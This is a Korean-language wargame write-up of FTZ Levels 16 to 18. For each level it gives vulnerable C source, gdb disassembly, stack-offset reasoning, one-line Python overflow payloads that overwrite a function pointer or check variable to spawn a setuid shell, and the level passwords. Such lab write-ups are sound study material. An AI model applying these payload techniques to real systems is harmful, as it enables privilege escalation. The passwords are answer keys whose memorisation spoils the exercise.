#================================================================================#
#FTZ Level 16
hint)
#include <stdio.h>
 
void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}
 
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}   

#FTZ Level 16 풀이 과정)

함수가 여러개 나눠져있다. main을 일단 까보자.
/tmp/16에 파일을 복사해서 진행했다.

main을 disassembly 해보면

Dump of assembler code for function main:
0x08048518 <main+0>:	push   ebp
0x08048519 <main+1>:	mov    ebp,esp
0x0804851b <main+3>:	sub    esp,0x38
0x0804851e <main+6>:	mov    DWORD PTR [ebp-16],0x8048500 //이부분에서 지금. (call*)() = printit; 이뤄지고 있다고 추측할 수 있다. 확인해보자.
0x08048525 <main+13>:	sub    esp,0x4
0x08048528 <main+16>:	push   ds:0x80496e8
0x0804852e <main+22>:	push   0x30
0x08048530 <main+24>:	lea    eax,[ebp-56]
0x08048533 <main+27>:	push   eax
0x08048534 <main+28>:	call   0x8048384 <fgets>
0x08048539 <main+33>:	add    esp,0x10
0x0804853c <main+36>:	mov    eax,DWORD PTR [ebp-16]
0x0804853f <main+39>:	call   eax
0x08048541 <main+41>:	leave  
0x08048542 <main+42>:	ret    
0x08048543 <main+43>:	nop    
0x08048544 <main+44>:	nop    
0x08048545 <main+45>:	nop    
0x08048546 <main+46>:	nop    
0x08048547 <main+47>:	nop    
0x08048548 <main+48>:	nop    
0x08048549 <main+49>:	nop    
0x0804854a <main+50>:	nop    
0x0804854b <main+51>:	nop    
0x0804854c <main+52>:	nop    
0x0804854d <main+53>:	nop    
0x0804854e <main+54>:	nop    
0x0804854f <main+55>:	nop    
End of assembler dump.
가 나온다.
printit을 까보면, 주소가 0x08048500가 나오는 것을 알 수 있다. 
위에서 추측했듯 ebp-16부분에 0x08048500이 아닌 shell 시작 함수의 주소를 리틀엔디언 방식으로 넣어준다면 가능할 것 같다.
Dump of assembler code for function printit:
0x08048500 <printit+0>:	push   ebp
0x08048501 <printit+1>:	mov    ebp,esp
0x08048503 <printit+3>:	sub    esp,0x8
0x08048506 <printit+6>:	sub    esp,0xc
0x08048509 <printit+9>:	push   0x80485c0
0x0804850e <printit+14>:	call   0x80483a4 <printf>
0x08048513 <printit+19>:	add    esp,0x10
0x08048516 <printit+22>:	leave  
0x08048517 <printit+23>:	ret    
End of assembler dump.

쉘의 시작주소가 0x080484d0 인것을 알았으니. 이제 거리를 구할 차례다.
Dump of assembler code for function shell:
0x080484d0 <shell+0>:	push   ebp
0x080484d1 <shell+1>:	mov    ebp,esp
0x080484d3 <shell+3>:	sub    esp,0x8
0x080484d6 <shell+6>:	sub    esp,0x8
0x080484d9 <shell+9>:	push   0xc19
0x080484de <shell+14>:	push   0xc19
0x080484e3 <shell+19>:	call   0x80483b4 <setreuid>
0x080484e8 <shell+24>:	add    esp,0x10
0x080484eb <shell+27>:	sub    esp,0xc
0x080484ee <shell+30>:	push   0x80485b8
0x080484f3 <shell+35>:	call   0x8048364 <system>
0x080484f8 <shell+40>:	add    esp,0x10
0x080484fb <shell+43>:	leave  
0x080484fc <shell+44>:	ret    
0x080484fd <shell+45>:	lea    esi,[esi]
End of assembler dump.

fgets가 이뤄지기전 stack에 buf가 쌓인 위치를 보면 [ebp-56]이다. 거기서 [ebp-16]을 빼주면 40이 나온다.
40바이트를 채워주고 넣어주면 되겠다.

페이로드는 이렇게 작성한다.
(python -c 'print "A"*40+"\xd0\x84\x04\x08"'; cat) | ./attackme

권한을 잘 얻어오는 것을 알 수 있다.
my-pass 하면 비밀번호가 나온다


답 == king poetic

#================================================================================#
#FTZ Level 17
hint)
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}



#FTZ Level 17 풀이 과정)
전과 다르게 코드가 shell 스크립트를 실행하는 코드가 없다. 딱보니 그냥 eggshell 주소를 대입하면 될 것 같았다.
그래도 혹시모르니 까봤으나 역시나, 똑같다.

Dump of assembler code for function main:
0x080484a8 <main+0>:	push   ebp
0x080484a9 <main+1>:	mov    ebp,esp
0x080484ab <main+3>:	sub    esp,0x38
0x080484ae <main+6>:	mov    DWORD PTR [ebp-16],0x8048490
0x080484b5 <main+13>:	sub    esp,0x4
0x080484b8 <main+16>:	push   ds:0x804967c
0x080484be <main+22>:	push   0x30
0x080484c0 <main+24>:	lea    eax,[ebp-56]
0x080484c3 <main+27>:	push   eax
0x080484c4 <main+28>:	call   0x8048350 <fgets>
0x080484c9 <main+33>:	add    esp,0x10
0x080484cc <main+36>:	sub    esp,0x8
0x080484cf <main+39>:	push   0xc1a
0x080484d4 <main+44>:	push   0xc1a
0x080484d9 <main+49>:	call   0x8048380 <setreuid>
0x080484de <main+54>:	add    esp,0x10
0x080484e1 <main+57>:	mov    eax,DWORD PTR [ebp-16]
0x080484e4 <main+60>:	call   eax
0x080484e6 <main+62>:	leave  
0x080484e7 <main+63>:	ret    
0x080484e8 <main+64>:	nop    
0x080484e9 <main+65>:	nop    
0x080484ea <main+66>:	nop    
0x080484eb <main+67>:	nop    
0x080484ec <main+68>:	nop    
0x080484ed <main+69>:	nop    
0x080484ee <main+70>:	nop    
0x080484ef <main+71>:	nop  

거리 구하는 것은 전과 같다.

40바이트 뒤에 에그쉘 주소를 리틀 엔디언 방식으로 입력하면 끝.

페이로드
(python -c 'print "A"*40+"\xc5\xf2\xff\xbf"'; cat) | ./attackme


답 == why did you do it








#================================================================================#
#FTZ Level 18
hint)

#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
void shellout(void);
int main()
{
  char string[100];
  int check;
  int x = 0;
  int count = 0;
  fd_set fds;
  printf("Enter your command: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 100)
        printf("what are you trying to do?\n");
      if(check == 0xdeadbeef)
        shellout();
      else
        {
          FD_ZERO(&fds);
          FD_SET(STDIN_FILENO,&fds);
 
          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
            {
              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)
                    {
                      case '\r':
                      case '\n':
                        printf("\a");
                        break;
                      case 0x08:
                        count--;
                        printf("\b \b");
                        break;
                      default:
                        string[count] = x;
                        count++;
                        break;
                    }
                }
            }
        }
    }
}

void shellout(void)
{
  setreuid(3099,3099);
  execl("/bin/sh","sh",NULL);
}   


#FTZ Level 18 풀이 과정)

check값이 =deadbeef면 shellout이 실행되고 권한을 얻어오며 쉘이 실행된다는 것을 알 수 있었다.
코드가 좀 복잡해 보이지만, 쉽게 말하면 string[100]을 넘을 순 있지만, count가 100을 넘으면 "what are you trying to do?\n" 가 뜨는 것을 알 수 있다.
밑에 스위치 문을 보면  0x08은  count를 -- 해주고 그외에는 count를 ++한다.
조꼼 이상한 조건이긴 하다만, 코드를 까보자.

근데 코드가 너무 길다.

0x080485ab <main+91>:	cmp    DWORD PTR [ebp-104],0xdeadbeef
일단 ebp-104에서 비교하는 것을 알 수 있다. 그럼 ebp-104위치에 deadbeef라는 값을 추가해주면 되겠는데,
string[100]의 위치를 알아야겠다.
 default:
                        string[count] = x;
                        count++;
                        break;
                    }
스트링을 한번도 접근 안하다가 마지막쯤에 버퍼를 추가해주며 count를 추가해주는 것을 볼 수 있다.
그렇다면 마지막쯤으로 넘어가보면 찾을 수 있다고 판단하고 넘어갔다.

0x08048741 <main+497>:	jmp    0x8048770 <main+544>
0x08048743 <main+499>:	lea    eax,[ebp-100]
jmp 그니까,  if(count >= 100)를 확인하러 간 후에 ebp-100값을 eax에 옮기고 ebp-252로 옮기는 것을 볼 수 있었다.
스트링의 위치는 ebp-100이고 , check의 위치는 104다. 이번에는 check의 위치가 더 크다.
-4의 거리에 deadbeef를 넣어주면 해결이 되겠다.

(python -c 'print "\x08"*4+"\xef\xbe\xad\xde"'; cat) |./attackme

평소와 같이 아무것도 아닌 것처럼 명령을 받지만, 명령어를 오타나면 shell 커맨드 찾을 수 없는 오류를 나타내는 것을 볼 수 있다.
my-pass로 비번을 알아낸다.

답 == swimming in pink